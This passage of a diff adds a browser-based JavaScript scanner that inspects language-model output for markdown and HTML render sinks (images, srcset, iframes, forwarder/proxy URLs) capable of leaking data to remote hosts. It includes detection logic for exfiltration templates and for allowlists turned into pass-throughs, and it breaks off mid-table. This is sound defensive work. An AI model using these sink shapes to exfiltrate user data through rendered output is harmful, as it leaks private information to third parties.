+      <a href="https://0xelitesystem.github.io/mcp-tool-poisoning-scanner/" rel="noopener">0xelitesystem.github.io/mcp-tool-poisoning-scanner</a></li>
+  </ul>
+</div>
+
+<footer>
+  <div class="flinks">
+    <a href="https://elitesystem.ai" rel="noopener">An elitesystem.ai tool</a>
+    <a href="https://github.com/0xelitesystem/llm-output-sink-scanner" rel="noopener">Source on GitHub</a>
+    <a href="https://0xelitesystem.github.io/" rel="noopener">More tools</a>
+  </div>
+  <p style="margin:0">
+    Runs entirely in your browser. No external dependencies, no API key, no backend, no telemetry.
+    MIT licensed.
+  </p>
+</footer>
+
+</div>
+
+<script>
+"use strict";
+
+/* ==========================================================================
+   PURE CORE
+   Every function below takes plain input and returns a plain result object.
+   No document, no window, no network, no globals beyond these constants.
+   Extractable and runnable in Node as-is.
+   ========================================================================== */
+
+var TOOL_VERSION = "1.0.0";
+
+/* Prototype-safe map helpers. A key named __proto__ or constructor must behave
+   like any other key, so every lookup table is a null-prototype object read
+   through hasOwnProperty. */
+function makeMap() { return Object.create(null); }
+function mapHas(m, k) { return Object.prototype.hasOwnProperty.call(m, String(k)); }
+function mapGet(m, k, dflt) { return mapHas(m, k) ? m[String(k)] : dflt; }
+function mapSet(m, k, v) { m[String(k)] = v; return m; }
+function mapFrom(pairs) {
+  var m = makeMap();
+  for (var i = 0; i < pairs.length; i++) { mapSet(m, pairs[i][0], pairs[i][1]); }
+  return m;
+}
+
+var HTML_SPACE = " \t\n\f\r";
+
+/* Built-in trims only. A hand-rolled trailing-space loop is quadratic on a
+   long run of spaces, which is a shape hostile input can supply on purpose. */
+function trimTrailing(s) {
+  var v = String(s == null ? "" : s);
+  return v.trimEnd ? v.trimEnd() : v.replace(/[\s\uFEFF]+$/, "");
+}
+function normalizeBlock(s) {
+  var parts = String(s == null ? "" : s).split("\n");
+  for (var i = 0; i < parts.length; i++) { parts[i] = trimTrailing(parts[i]); }
+  while (parts.length > 1 && parts[parts.length - 1] === "") { parts.pop(); }
+  return parts.join("\n");
+}
+var ATTR_SEPARATORS = " \t\n\f\r/";
+
+/* Attribute names rewritten before any parser sees the text. Longest first so
+   srcset is not shadowed by src. */
+var SINK_ATTRS = [
+  "srcset", "srcdoc", "src", "href", "data", "poster", "background", "style",
+  "action", "formaction", "ping", "cite", "manifest", "lowsrc", "dynsrc",
+  "imagesrcset", "longdesc", "usemap", "codebase", "archive", "profile"
+];
+var SINK_TAGS = ["style", "link", "base", "meta"];
+var ATTR_PREFIX = "data-sink-";
+var TAG_PREFIX = "x-sink-";
+
+var NEUTRALIZE_RE = new RegExp(
+  "<(/?)(" + SINK_TAGS.join("|") + ")\\b" +
+  "|([ \\t\\n\\f\\r/])((?:xlink:)?(?:" + SINK_ATTRS.join("|") + "))([ \\t\\n\\f\\r]*=)",
+  "gi"
+);
+
+/**
+ * neutralizeMarkup: the first and only thing that touches raw model output.
+ * Rewrites every attribute name that can name a resource, and every element
+ * name that can pull one, into inert names, on the string. Length only ever
+ * grows by a fixed prefix, so offsets remain recoverable.
+ */
+function neutralizeMarkup(raw) {
+  var input = String(raw == null ? "" : raw).replace(/\u0000/g, " ");
+  var out = "";
+  var insertions = [];
+  var last = 0;
+  var rewrites = 0;
+  var m;
+  NEUTRALIZE_RE.lastIndex = 0;
+  while ((m = NEUTRALIZE_RE.exec(input)) !== null) {
+    if (m[0].length === 0) { NEUTRALIZE_RE.lastIndex++; continue; }
+    out += input.slice(last, m.index);
+    if (m[2] !== undefined) {
+      out += "<" + m[1] + TAG_PREFIX + m[2];
+      insertions.push({ at: out.length - TAG_PREFIX.length - m[2].length, len: TAG_PREFIX.length });
+    } else {
+      out += m[3] + ATTR_PREFIX + m[4] + m[5];
+      insertions.push({ at: out.length - m[5].length - m[4].length - ATTR_PREFIX.length, len: ATTR_PREFIX.length });
+    }
+    rewrites++;
+    last = m.index + m[0].length;
+  }
+  out += input.slice(last);
+  return { safe: out, insertions: insertions, rewrites: rewrites };
+}
+
+/**
+ * makeSourceMapper: insertions are recorded in increasing order and never
+ * overlap, so both the "at" array and the "end" array are sorted. One prefix
+ * sum plus a binary search turns what was a per-element linear scan into a
+ * logarithmic lookup. Scanning it linearly for every element is quadratic on a
+ * response holding tens of thousands of tags, which is a shape hostile input
+ * can supply on purpose.
+ */
+function makeSourceMapper(insertions) {
+  var ins = insertions || [];
+  var cum = [];
+  var run = 0;
+  for (var i = 0; i < ins.length; i++) { run += ins[i].len; cum.push(run); }
+  return function (idx) {
+    var lo = 0, hi = ins.length - 1, found = -1;
+    while (lo <= hi) {
+      var mid = (lo + hi) >> 1;
+      if (ins[mid].at + ins[mid].len <= idx) { found = mid; lo = mid + 1; } else { hi = mid - 1; }
+    }
+    var shift = (found >= 0) ? cum[found] : 0;
+    var nxt = found + 1;
+    if (nxt < ins.length && ins[nxt].at < idx) { shift += idx - ins[nxt].at; }
+    var r = idx - shift;
+    return r < 0 ? 0 : r;
+  };
+}
+
+/** Map an index in the neutralized string back to an index in the source. */
+function mapToSource(insertions, idx) { return makeSourceMapper(insertions)(idx); }
+
+/**
+ * makeLineIndex: one pass to collect newline offsets, then a binary search per
+ * lookup. lineAt is linear, so calling it once per match is quadratic on a
+ * large response. Anything inside a loop uses this instead.
+ */
+function makeLineIndex(text) {
+  var s = String(text == null ? "" : text);
+  var starts = [0];
+  for (var i = 0; i < s.length; i++) { if (s.charAt(i) === "\n") { starts.push(i + 1); } }
+  return function (idx) {
+    var lo = 0, hi = starts.length - 1;
+    while (lo < hi) {
+      var mid = (lo + hi + 1) >> 1;
+      if (starts[mid] <= idx) { lo = mid; } else { hi = mid - 1; }
+    }
+    return lo + 1;
+  };
+}
+
+/** Line number (1-based) for a character offset. One-off use only. */
+function lineAt(text, idx) {
+  var n = 1;
+  var stop = Math.min(idx, String(text).length);
+  for (var i = 0; i < stop; i++) { if (text.charAt(i) === "\n") { n++; } }
+  return n;
+}
+
+/** Decode the character references that a real parser decodes in attribute values. */
+var NAMED_ENTITIES = mapFrom([
+  ["amp", "&"], ["lt", "<"], ["gt", ">"], ["quot", "\""], ["apos", "'"],
+  ["nbsp", " "], ["sol", "/"], ["colon", ":"], ["lpar", "("], ["rpar", ")"],
+  ["Tab", "\t"], ["NewLine", "\n"], ["semi", ";"], ["equals", "="], ["num", "#"]
+]);
+function decodeEntities(value) {
+  var s = String(value == null ? "" : value);
+  if (s.indexOf("&") < 0) { return s; }
+  return s.replace(/&(#[xX][0-9a-fA-F]{1,6}|#[0-9]{1,7}|[a-zA-Z][a-zA-Z0-9]{1,31});?/g, function (whole, body) {
+    var cp = -1;
+    if (body.charAt(0) === "#") {
+      var hex = (body.charAt(1) === "x" || body.charAt(1) === "X");
+      cp = parseInt(hex ? body.slice(2) : body.slice(1), hex ? 16 : 10);
+    } else if (mapHas(NAMED_ENTITIES, body)) {
+      return mapGet(NAMED_ENTITIES, body, whole);
+    } else {
+      return whole;
+    }
+    if (!Number.isFinite(cp) || cp < 0 || cp > 0x10ffff) { return whole; }
+    if (cp === 0 || (cp < 0x20 && cp !== 0x09 && cp !== 0x0a && cp !== 0x0d)) { return ""; }
+    if (cp >= 0xd800 && cp <= 0xdfff) { return whole; }
+    try { return String.fromCodePoint(cp); } catch (e) { return whole; }
+  });
+}
+
+/**
+ * maskCodeRegions: blanks out regions that a markdown renderer will not turn
+ * into live structure, without moving a single character. Offsets in the masked
+ * string are identical to offsets in the source, so line numbers stay true.
+ */
+function maskCodeRegions(text) {
+  var src = String(text == null ? "" : text);
+  var chars = src.split("");
+  var regions = [];
+
+  function maskRange(a, b, kind) {
+    var lo = Math.max(0, a), hi = Math.min(chars.length, b);
+    if (hi <= lo) { return; }
+    for (var i = lo; i < hi; i++) {
+      if (chars[i] !== "\n" && chars[i] !== "\r") { chars[i] = " "; }
+    }
+    regions.push({ start: lo, end: hi, kind: kind, text: src.slice(lo, hi) });
+  }
+
+  /* line index */
+  var lineStarts = [0];
+  for (var i = 0; i < src.length; i++) { if (src.charAt(i) === "\n") { lineStarts.push(i + 1); } }
+  function lineEnd(li) {
+    return (li + 1 < lineStarts.length) ? lineStarts[li + 1] : src.length;
+  }
+  function lineText(li) {
+    var e = lineEnd(li);
+    var t = src.slice(lineStarts[li], e);
+    return t.replace(/\r?\n$/, "");
+  }
+
+  /* 1. fenced code blocks */
+  var openFence = null;
+  var fenceStart = 0;
+  var li;
+  var blankBefore = true;
+  for (li = 0; li < lineStarts.length; li++) {
+    var lt = lineText(li);
+    var fm = /^ {0,3}(`{3,}|~{3,})/.exec(lt);
+    if (openFence === null) {
+      if (fm) {
+        openFence = { ch: fm[1].charAt(0), len: fm[1].length };
+        fenceStart = lineStarts[li];
+      }
+    } else {
+      var cm = /^ {0,3}(`{3,}|~{3,})[ \t]*$/.exec(lt);
+      if (cm && cm[1].charAt(0) === openFence.ch && cm[1].length >= openFence.len) {
+        maskRange(fenceStart, lineEnd(li), "fenced-code");
+        openFence = null;
+      }
+    }
+  }
+  if (openFence !== null) { maskRange(fenceStart, src.length, "fenced-code-unclosed"); }
+
+  /* 2. indented code blocks (four or more spaces, after a blank line) */
+  var inIndented = false;
+  var indentStart = 0;
+  blankBefore = true;
+  for (li = 0; li < lineStarts.length; li++) {
+    var raw = src.slice(lineStarts[li], lineEnd(li)).replace(/\r?\n$/, "");
+    var masked = chars.slice(lineStarts[li], lineEnd(li)).join("").replace(/\r?\n$/, "");
+    var isBlank = /^[ \t]*$/.test(raw);
+    var isIndented = /^(?: {4}|\t)/.test(raw) && !/^[ \t]*$/.test(raw);
+    var alreadyMasked = /^[ ]*$/.test(masked) && !isBlank;
+    if (!inIndented && isIndented && blankBefore && !alreadyMasked) {
+      inIndented = true; indentStart = lineStarts[li];
+    } else if (inIndented && !isIndented && !isBlank) {
+      maskRange(indentStart, lineStarts[li], "indented-code");
+      inIndented = false;
+    }
+    if (!isBlank) { blankBefore = false; } else { blankBefore = true; }
+  }
+  if (inIndented) { maskRange(indentStart, src.length, "indented-code"); }
+
+  /* 3. HTML comments (CommonMark passes them through as raw HTML) */
+  var ci = 0;
+  while (ci < chars.length) {
+    var open = src.indexOf("<!--", ci);
+    if (open < 0) { break; }
+    if (chars[open] !== "<") { ci = open + 4; continue; }
+    var close = src.indexOf("-->", open + 4);
+    var end = (close < 0) ? src.length : close + 3;
+    maskRange(open, end, "html-comment");
+    ci = end;
+  }
+
+  /* 4. inline code spans, over what survives */
+  var k = 0;
+  while (k < chars.length) {
+    if (chars[k] !== "`") { k++; continue; }
+    var runStart = k;
+    var run = 0;
+    while (k < chars.length && chars[k] === "`") { run++; k++; }
+    var p = k;
+    var found = -1;
+    while (p < chars.length) {
+      if (chars[p] === "`") {
+        var s2 = p, r2 = 0;
+        while (p < chars.length && chars[p] === "`") { r2++; p++; }
+        if (r2 === run) { found = s2; break; }
+      } else { p++; }
+    }
+    if (found >= 0) { maskRange(runStart, found + run, "code-span"); k = found + run; }
+  }
+
+  return { masked: chars.join(""), regions: regions };
+}
+
+/* ---------- markdown reference resolution (CommonMark 0.31.2 shapes) ------- */
+
+var MAX_LABEL = 999;
+
+function normalizeLabel(label) {
+  var s = String(label == null ? "" : label);
+  s = s.replace(/[ \t\r\n]+/g, " ").trim();
+  return s.toLowerCase();
+}
+
+function readBracketed(text, openIdx) {
+  /* text.charAt(openIdx) is "[". Returns {end, inner} or null. */
+  var depth = 0;
+  for (var i = openIdx; i < text.length; i++) {
+    var c = text.charAt(i);
+    if (c === "\\") { i++; continue; }
+    if (c === "[") { depth++; }
+    else if (c === "]") {
+      depth--;
+      if (depth === 0) {
+        var inner = text.slice(openIdx + 1, i);
+        if (inner.length > MAX_LABEL) { return null; }
+        return { end: i, inner: inner };
+      }
+    }
+    if (i - openIdx > MAX_LABEL + 8) { return null; }
+  }
+  return null;
+}
+
+function readInlineDestination(text, openParen) {
+  /* text.charAt(openParen) is "(". Returns {end, dest, title} or null. */
+  var i = openParen + 1;
+  while (i < text.length && HTML_SPACE.indexOf(text.charAt(i)) >= 0) { i++; }
+  var dest = "";
+  if (text.charAt(i) === "<") {
+    var gt = i + 1;
+    while (gt < text.length && text.charAt(gt) !== ">" && text.charAt(gt) !== "\n") {
+      if (text.charAt(gt) === "\\") { gt++; }
+      gt++;
+    }
+    if (text.charAt(gt) !== ">") { return null; }
+    dest = text.slice(i + 1, gt);
+    i = gt + 1;
+  } else {
+    var depth = 0;
+    var start = i;
+    while (i < text.length) {
+      var c = text.charAt(i);
+      if (c === "\\") { i += 2; continue; }
+      if (HTML_SPACE.indexOf(c) >= 0) { break; }
+      if (c === "(") { depth++; }
+      if (c === ")") { if (depth === 0) { break; } depth--; }
+      i++;
+    }
+    dest = text.slice(start, i);
+  }
+  while (i < text.length && HTML_SPACE.indexOf(text.charAt(i)) >= 0) { i++; }
+  var title = "";
+  var q = text.charAt(i);
+  if (q === "\"" || q === "'" || q === "(") {
+    var endq = (q === "(") ? ")" : q;
+    var ts = i + 1;
+    var j = ts;
+    while (j < text.length && text.charAt(j) !== endq) { if (text.charAt(j) === "\\") { j++; } j++; }
+    title = text.slice(ts, j);
+    i = j + 1;
+    while (i < text.length && HTML_SPACE.indexOf(text.charAt(i)) >= 0) { i++; }
+  }
+  if (text.charAt(i) !== ")") { return null; }
+  return { end: i, dest: dest, title: title };
+}
+
+/**
+ * collectLinkDefinitions: scans the WHOLE document, not one line at a time.
+ * A line-local regex is exactly what shipped filters used, and exactly what a
+ * definition placed forty lines away from its use walks straight past.
+ */
+function collectLinkDefinitions(masked) {
+  var defs = makeMap();
+  var order = [];
+  var lineStarts = [0];
+  var i;
+  for (i = 0; i < masked.length; i++) { if (masked.charAt(i) === "\n") { lineStarts.push(i + 1); } }
+  for (var li = 0; li < lineStarts.length; li++) {
+    var start = lineStarts[li];
+    var end = (li + 1 < lineStarts.length) ? lineStarts[li + 1] : masked.length;
+    var line = masked.slice(start, end).replace(/\r?\n$/, "");
+    var lead = /^ {0,3}\[/.exec(line);
+    if (!lead) { continue; }
+    var br = readBracketed(line, lead[0].length - 1);
+    if (!br) { continue; }
+    var after = br.end + 1;
+    if (line.charAt(after) !== ":") { continue; }
+    var rest = line.slice(after + 1);
+    var destText = rest.replace(/^[ \t]+/, "");
+    var defLine = li + 1;
+    if (destText === "" && li + 1 < lineStarts.length) {
+      var nstart = lineStarts[li + 1];
+      var nend = (li + 2 < lineStarts.length) ? lineStarts[li + 2] : masked.length;
+      destText = masked.slice(nstart, nend).replace(/\r?\n$/, "").replace(/^[ \t]+/, "");
+    }
+    if (destText === "") { continue; }
+    var dm = /^(<[^<>\n]*>|[^\s]+)/.exec(destText);
+    if (!dm) { continue; }
+    var dest = dm[1];
+    if (dest.charAt(0) === "<" && dest.charAt(dest.length - 1) === ">") { dest = dest.slice(1, -1); }
+    var key = normalizeLabel(br.inner);
+    if (key === "" || mapHas(defs, key)) { continue; }
+    mapSet(defs, key, { label: br.inner, dest: dest, line: defLine, offset: start });
+    order.push(key);
+  }
+  return { defs: defs, order: order, count: order.length };
+}
+
+/**
+ * extractMarkdownTargets: resolves inline, full reference, collapsed reference
+ * and shortcut reference images and links against the document-wide definitions.
+ */
+function extractMarkdownTargets(masked) {
+  var defsResult = collectLinkDefinitions(masked);
+  var defs = defsResult.defs;
+  var out = [];
+  var i = 0;
+  var guard = 0;
+  /* Every iteration advances i by at least one, so the length of the input is
+     itself the loop bound. A fixed cap would silently stop scanning half of a
+     long response while the summary still reported the full character count. */
+  var maxSteps = masked.length + 16;
+  var lineOf = makeLineIndex(masked);
+  while (i < masked.length && guard < maxSteps) {
+    guard++;
+    var c = masked.charAt(i);
+    if (c !== "[") { i++; continue; }
+    /* backslash-escaped bracket is not a bracket */
+    var back = 0, bi = i - 1;
+    while (bi >= 0 && masked.charAt(bi) === "\\") { back++; bi--; }
+    if (back % 2 === 1) { i++; continue; }
+
+    /* readBracketed gives up after MAX_LABEL + 8 characters, so an opening
+       bracket with no closing bracket inside that window can never resolve.
+       Checking that first turns a response made of 400,000 unmatched brackets
+       from a second and a half of scanning into one indexOf. */
+    var nextClose = masked.indexOf("]", i);
+    if (nextClose < 0) { break; }
+    if (nextClose - i > MAX_LABEL + 8) { i = nextClose - (MAX_LABEL + 8); continue; }
+
+    var isImage = false;
+    if (i > 0 && masked.charAt(i - 1) === "!") {
+      var b2 = 0, bj = i - 2;
+      while (bj >= 0 && masked.charAt(bj) === "\\") { b2++; bj--; }
+      if (b2 % 2 === 0) { isImage = true; }
+    }
+
+    var br = readBracketed(masked, i);
+    if (!br) { i++; continue; }
+
+    /* a definition line is not a use */
+    if (masked.charAt(br.end + 1) === ":") {
+      var ls = masked.lastIndexOf("\n", i);
+      var pre = masked.slice(ls + 1, i);
+      if (/^ {0,3}$/.test(pre)) { i = br.end + 1; continue; }
+    }
+
+    var startIdx = isImage ? i - 1 : i;
+    var next = masked.charAt(br.end + 1);
+    var rec = null;
+
+    if (next === "(") {
+      var inl = readInlineDestination(masked, br.end + 1);
+      if (inl) {
+        rec = { style: "inline", dest: inl.dest, label: br.inner, defLine: null, end: inl.end };
+      }
+    } else if (next === "[") {
+      var br2 = readBracketed(masked, br.end + 1);
+      if (br2) {
+        var lbl = (br2.inner.replace(/[ \t\r\n]+/g, "") === "") ? br.inner : br2.inner;
+        var style = (br2.inner.replace(/[ \t\r\n]+/g, "") === "") ? "collapsed" : "full-reference";
+        var key = normalizeLabel(lbl);
+        if (mapHas(defs, key)) {
+          var d = mapGet(defs, key, null);
+          rec = { style: style, dest: d.dest, label: lbl, defLine: d.line, end: br2.end };
+        }
+      }
+    }
+    if (rec === null && next !== "(" && next !== "[") {
+      var k2 = normalizeLabel(br.inner);
+      if (mapHas(defs, k2)) {
+        var d2 = mapGet(defs, k2, null);
+        rec = { style: "shortcut", dest: d2.dest, label: br.inner, defLine: d2.line, end: br.end };
+      }
+    }
+
+    if (rec) {
+      out.push({
+        kind: isImage ? "image" : "link",
+        style: rec.style,
+        label: rec.label,
+        dest: rec.dest,
+        offset: startIdx,
+        useLine: lineOf(startIdx),
+        defLine: rec.defLine
+      });
+      i = rec.end + 1;
+    } else {
+      i = br.end + 1;
+    }
+  }
+  return { targets: out, definitions: defsResult };
+}
+
+/* ---------- neutralized-markup tokenizer (pure, no DOM) -------------------- */
+
+function tokenizeMarkup(safe) {
+  var s = String(safe == null ? "" : safe);
+  var lower = s.toLowerCase();
+  var elements = [];
+  var i = 0;
+  var guard = 0;
+  var n = s.length;
+  var maxSteps = n + 16;
+  while (i < n && guard < maxSteps) {
+    guard++;
+    var lt = s.indexOf("<", i);
+    if (lt < 0) { break; }
+    if (s.substr(lt, 4) === "<!--") {
+      var ce = s.indexOf("-->", lt + 4);
+      i = (ce < 0) ? n : ce + 3;
+      continue;
+    }
+    var closing = (s.charAt(lt + 1) === "/");
+    var nameStart = lt + (closing ? 2 : 1);
+    if (!/[a-zA-Z]/.test(s.charAt(nameStart))) { i = lt + 1; continue; }
+    var j = nameStart;
+    while (j < n && " \t\n\f\r/>".indexOf(s.charAt(j)) < 0) { j++; }
+    var tag = lower.slice(nameStart, j);
+
+    var attrs = makeMap();
+    var order = [];
+    var aguard = 0;
+    while (j < n && aguard < 4000) {
+      aguard++;
+      while (j < n && ATTR_SEPARATORS.indexOf(s.charAt(j)) >= 0) { j++; }
+      if (j >= n || s.charAt(j) === ">") { break; }
+      var an = j;
+      while (j < n && " \t\n\f\r/>=".indexOf(s.charAt(j)) < 0) { j++; }
+      var aname = lower.slice(an, j);
+      if (aname === "") { j++; continue; }
+      var k = j;
+      while (k < n && HTML_SPACE.indexOf(s.charAt(k)) >= 0) { k++; }
+      var avalue = "";
+      if (s.charAt(k) === "=") {
+        k++;
+        while (k < n && HTML_SPACE.indexOf(s.charAt(k)) >= 0) { k++; }
+        var q = s.charAt(k);
+        if (q === "\"" || q === "'") {
+          var eq = s.indexOf(q, k + 1);
+          if (eq < 0) { eq = n; }
+          avalue = s.slice(k + 1, eq);
+          k = Math.min(eq + 1, n);
+        } else {
+          var vs = k;
+          while (k < n && " \t\n\f\r>".indexOf(s.charAt(k)) < 0) { k++; }
+          avalue = s.slice(vs, k);
+        }
+        j = k;
+      }
+      if (!mapHas(attrs, aname)) { mapSet(attrs, aname, decodeEntities(avalue)); order.push(aname); }
+    }
+    var gt = (j < n && s.charAt(j) === ">") ? j : s.indexOf(">", j);
+    i = (gt < 0) ? n : gt + 1;
+
+    var rawText = null;
+    if (!closing && (tag === "x-sink-style" || tag === "script" || tag === "textarea" || tag === "title")) {
+      var close = lower.indexOf("</" + tag, i);
+      rawText = (close < 0) ? s.slice(i) : s.slice(i, close);
+      i = (close < 0) ? n : close;
+    }
+    if (!closing) {
+      elements.push({ tag: tag, attrs: attrs, order: order, index: lt, rawText: rawText });
+    }
+  }
+  return { elements: elements, count: elements.length };
+}
+
+/* ---------- URL classification -------------------------------------------- */
+
+var FORWARDER_PARAMS = mapFrom([
+  ["url", 1], ["u", 1], ["uri", 1], ["target", 1], ["dest", 1], ["destination", 1],
+  ["redirect", 1], ["redirect_uri", 1], ["next", 1], ["continue", 1], ["link", 1],
+  ["image", 1], ["img", 1], ["src", 1], ["proxy", 1], ["fetch", 1], ["embed", 1],
+  ["preview", 1], ["unfurl", 1], ["q", 1], ["r", 1], ["to", 1], ["callback", 1]
+]);
+
+function parseUrlParts(raw) {
+  var u = String(raw == null ? "" : raw).trim();
+  var parts = {
+    raw: u, scheme: "", host: "", port: "", path: "", query: "", fragment: "",
+    relative: false, protocolRelative: false, valid: u.length > 0
+  };
+  if (!parts.valid) { return parts; }
+  var hi = u.indexOf("#");
+  if (hi >= 0) { parts.fragment = u.slice(hi + 1); u = u.slice(0, hi); }
+  var qi = u.indexOf("?");
+  if (qi >= 0) { parts.query = u.slice(qi + 1); u = u.slice(0, qi); }
+  var sm = /^([a-zA-Z][a-zA-Z0-9+.\-]{0,31}):/.exec(u);
+  if (sm) {
+    parts.scheme = sm[1].toLowerCase();
+    u = u.slice(sm[0].length);
+  }
+  if (u.slice(0, 2) === "//") {
+    if (parts.scheme === "") { parts.protocolRelative = true; }
+    u = u.slice(2);
+    var slash = u.indexOf("/");
+    var authority = (slash < 0) ? u : u.slice(0, slash);
+    parts.path = (slash < 0) ? "" : u.slice(slash);
+    var at = authority.lastIndexOf("@");
+    if (at >= 0) { authority = authority.slice(at + 1); }
+    var cm = authority.lastIndexOf(":");
+    if (cm > authority.lastIndexOf("]")) {
+      parts.port = authority.slice(cm + 1);
+      authority = authority.slice(0, cm);
+    }
+    parts.host = authority.toLowerCase();
+  } else {
+    parts.path = u;
+    if (parts.scheme === "") { parts.relative = true; }
+  }
+  return parts;
+}
+
+function splitQuery(query) {
+  var out = [];
+  var q = String(query == null ? "" : query);
+  if (q === "") { return out; }
+  var pieces = q.split(/[&;]/);
+  for (var i = 0; i < pieces.length; i++) {
+    if (pieces[i] === "") { continue; }
+    var eq = pieces[i].indexOf("=");
+    var name = (eq < 0) ? pieces[i] : pieces[i].slice(0, eq);
+    var value = (eq < 0) ? "" : pieces[i].slice(eq + 1);
+    out.push({ name: name.toLowerCase(), value: value });
+  }
+  return out;
+}
+
+function safeDecode(v) {
+  try { return decodeURIComponent(String(v).replace(/\+/g, " ")); }
+  catch (e) { return String(v); }
+}
+
+function hostMatchesAllowlist(host, allowlist) {
+  if (!host) { return null; }
+  for (var i = 0; i < allowlist.length; i++) {
+    var entry = allowlist[i];
+    if (entry === "") { continue; }
+    if (entry.charAt(0) === "*" && entry.charAt(1) === ".") {
+      var suffix = entry.slice(1);
+      if (host === entry.slice(2) || host.slice(-suffix.length) === suffix) { return entry; }
+    } else if (entry.charAt(0) === ".") {
+      if (host === entry.slice(1) || host.slice(-entry.length) === entry) { return entry; }
+    } else if (host === entry) {
+      return entry;
+    }
+  }
+  return null;
+}
+
+/**
+ * classifyDestination. Deliberately has no "safe" verdict. An allowlist stops
+ * being a boundary the moment an allowlisted host will fetch something for you,
+ * which is how a CSP allowlist was walked through in the case receipt below.
+ */
+function classifyDestination(rawUrl, allowlist) {
+  var p = parseUrlParts(rawUrl);
+  var reasons = [];
+  var out = {
+    url: p.raw, scheme: p.scheme, host: p.host, verdict: "unknown",
+    verdictLabel: "", external: false, network: false,
+    allowEntry: null, forwarder: false, nested: "", payloadBytes: 0,
+    placeholder: false, reasons: reasons
+  };
+
+  var tail = (p.path || "") + (p.query ? "?" + p.query : "") + (p.fragment ? "#" + p.fragment : "");
+  out.payloadBytes = tail.length;
+
+  if (/(<[a-z_][a-z0-9_ .\-]{0,60}>|\{\{[^}]{1,80}\}\}|\$\{[^}]{1,80}\}|\[(?:secret|redacted|placeholder|data)\])/i.test(p.raw)) {
+    out.placeholder = true;
+    reasons.push("Contains a placeholder the model was expected to fill in, which is the signature of an instructed exfiltration template.");
+  }
+
+  if (p.scheme === "data" || p.scheme === "blob" || p.scheme === "cid" || p.scheme === "about") {
+    out.verdict = "no-network";
+    out.verdictLabel = "no network fetch (" + p.scheme + " scheme)";
+    reasons.push("A " + p.scheme + " URL does not reach a remote host.");
+    return out;
+  }
+  if (p.scheme === "javascript" || p.scheme === "vbscript") {
+    out.verdict = "script-scheme";
+    out.verdictLabel = "script scheme";
+    reasons.push("A script scheme is not fetched by an image, but it is live if this ends up on a link or a frame.");
+    return out;
+  }
+
+  if (p.host === "") {
+    if (p.relative || p.scheme === "") {
+      out.verdict = "relative";
+      out.verdictLabel = "relative to your own origin";
+      reasons.push("No host, so this resolves against your own origin. It cannot carry data off-site by itself.");
+      return out;
+    }
+    /* A scheme with no authority: mailto, tel, sms, and also a malformed
+       http:/one-slash URL. Reporting these as "not on your allowlist" printed
+       an empty host into the reason, which read as a bug in the tool. */
+    if (p.scheme === "http" || p.scheme === "https" || p.scheme === "ftp" || p.scheme === "ws" || p.scheme === "wss") {
+      out.verdict = "malformed";
+      out.verdictLabel = "declares " + p.scheme + " but names no host";
+      reasons.push("This declares the " + p.scheme + " scheme and then names no host, so there is no origin to address. Renderers disagree about what to do with it, which is worth a look on its own.");
+      return out;
+    }
+    out.verdict = "no-host-scheme";
+    out.verdictLabel = p.scheme + " scheme, no host to fetch from";
+    reasons.push("A " + p.scheme + " URL names no host, so a renderer issues no HTTP request for it. It is handed to whatever application is registered for the " + p.scheme + " scheme.");
+    return out;
+  }
+
+  out.network = true;
+  out.external = true;
+
+  var qs = splitQuery(p.query);
+  var nestedFrom = "";
+  var haystacks = [p.query, p.fragment, p.path];
+  for (var h = 0; h < haystacks.length && !out.forwarder; h++) {
+    var dec = safeDecode(haystacks[h]);
+    if (/https?:\/\/[^\s]/i.test(dec) || /^\/\/[a-z0-9.\-]+\./i.test(dec)) {
+      out.forwarder = true;
+      nestedFrom = dec;
+    }
+  }
+  for (var i = 0; i < qs.length; i++) {
+    if (mapHas(FORWARDER_PARAMS, qs[i].name)) {
+      var dv = safeDecode(qs[i].value);
+      if (/https?:\/\//i.test(dv) || /^[a-z0-9\-]+(\.[a-z0-9\-]+){1,}(\/|$)/i.test(dv)) {
+        out.forwarder = true;
+        nestedFrom = dv;
+      }
+    }
+  }
+  if (out.forwarder) {
+    var nm = /(https?:\/\/[^\s"'<>]{1,300}|(?:^|\s)\/\/[a-z0-9.\-]+[^\s"'<>]{0,300})/i.exec(nestedFrom);
+    out.nested = nm ? nm[1].trim() : nestedFrom.slice(0, 300);
+  }
+
+  out.allowEntry = hostMatchesAllowlist(p.host, allowlist);
+
+  if (out.forwarder) {
+    out.verdict = "forwarder";
+    out.verdictLabel = out.allowEntry
+      ? "allowlisted, and shaped like a forwarder"
+      : "shaped like a forwarder";
+    reasons.push("This URL carries another URL inside it, which is the shape of a preview, unfurl, embed or proxy endpoint that fetches on the caller's behalf.");
+    if (out.allowEntry) {
+      reasons.push("Matching your allowlist entry " + out.allowEntry + " makes this worse, not better: the allowlist is what lets the request out, and the endpoint is what carries it onward.");
+    }
+  } else if (out.allowEntry) {
+    out.verdict = "allowlisted";
+    out.verdictLabel = "on your allowlist, which is not a boundary";
+    reasons.push("Host matches your allowlist entry " + out.allowEntry + ". That means the request is permitted, not that it is contained. If this host will fetch a URL supplied in a parameter, your allowlist is a pass-through.");
+  } else {
+    out.verdict = "off-allowlist";
+    out.verdictLabel = "not on your allowlist";
+    reasons.push("Host " + p.host + " is not on your allowlist.");
+  }
+
+  if (out.payloadBytes > 0) {
+    reasons.push("Attacker-controllable capacity beyond the origin: " + out.payloadBytes +
+      (out.payloadBytes === 1 ? " character" : " characters") +
+      " of path, query and fragment. Every one of them is delivered to " + p.host + " in the request line.");
+  }
+  return out;
+}
+
+/* ---------- render sink ---------------------------------------------------- */
+
+/* (element, attribute) pairs, keyed exactly as measured. */
+var FETCH_TABLE = mapFrom([
+  ["img|src", { auto: true, what: "image source" }],
+  ["img|srcset", { auto: true, what: "image candidate set" }],
+  ["img|lowsrc", { auto: true, what: "legacy image source" }],
+  ["source|srcset", { auto: true, what: "picture source candidate" }],
+  ["source|src", { auto: true, what: "media source" }],
+  ["image|href", { auto: true, what: "svg image" }],
+  ["image|xlink:href", { auto: true, what: "svg image (legacy link)" }],
+  ["use|href", { auto: true, what: "svg external use" }],
+  ["use|xlink:href", { auto: true, what: "svg external use (legacy link)" }],
+  ["feimage|href", { auto: true, what: "svg filter image" }],
+  ["video|poster", { auto: true, what: "video poster frame" }],
+  ["video|src", { auto: true, what: "video source" }],
+  ["audio|src", { auto: true, what: "audio source" }],
+  ["object|data", { auto: true, what: "object data" }],
+  ["embed|src", { auto: true, what: "embed source" }],
+  ["iframe|src", { auto: true, what: "inline frame" }],
+  ["iframe|srcdoc", { auto: true, what: "inline frame document" }],
+  ["input|src", { auto: true, what: "image input", requiresTypeImage: true }],
